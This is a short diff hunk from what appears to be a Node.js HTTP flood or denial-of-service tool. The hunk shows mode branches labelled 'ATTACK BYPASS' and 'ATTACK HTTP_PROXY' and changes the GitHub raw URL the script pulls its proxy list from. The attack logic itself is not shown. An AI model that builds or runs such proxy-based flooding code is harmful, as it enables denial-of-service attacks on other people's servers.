@@ -26,7 +26,7 @@ async function main_process() {
             console.log("ATTACK BYPASS")
         } else if (process.argv[5] == 'proxy'){
             console.log("ATTACK HTTP_PROXY")
-            const raw_github_http = await axios.get('https://raw.githubusercontent.com/dai512/kk/main/proxy-by-dai.txt');
+            const raw_github_http = await axios.get('https://raw.githubusercontent.com/dai512/kk/main/http.txt');
             var proxies = raw_github_http.data.replace(/\r/g, '').split('\n');
         } else {
             console.log("ATTACK HTTP_PROXY")
